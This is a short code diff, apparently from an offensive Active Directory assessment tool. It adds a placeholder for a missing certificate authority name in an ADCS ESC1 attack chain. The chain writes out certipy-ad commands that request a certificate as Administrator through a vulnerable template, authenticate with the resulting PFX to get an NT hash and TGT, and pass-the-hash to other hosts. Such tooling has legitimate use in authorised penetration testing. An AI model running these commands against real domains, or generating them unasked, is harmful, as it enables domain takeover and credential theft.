@@ -1177,12 +1177,15 @@ def run(report, store, ui=None):
                 continue
             _emitted_tpls.add(_tkey)
             _esc_tag = ",".join(_fires)
+            # iter-88: fall back to '<CA>' placeholder when BH-CE data has
+            # no CA link (only certipy find carries the CA context reliably).
+            _ca_tag = tpl["ca"] or "<CA>"
             chains.append(Chain("R-ADCS-ESC1", "ADCS ESC1 -> Administrator PFX",
                 f"{_esc_tag} template '{tpl['template']}' -> req cert as Administrator",
                 crit=9, conf=0.9, ready=1.4, prox=0.95,      # score 10.77
                 commands=[
                     f"certipy-ad req -u '{_disp_ac}@{_dom_esc}' -p '{_pw_ac}' "
-                    f"-ca '{tpl['ca']}' -template '{tpl['template']}' "
+                    f"-ca '{_ca_tag}' -template '{tpl['template']}' "
                     f"-upn 'administrator@{_dom_esc}' -dc-ip {_dc_esc}",
                     f"certipy-ad auth -pfx administrator.pfx -dc-ip {_dc_esc}",
                     f"# certipy prints the NT hash + TGT; PtH via R7 to any host",
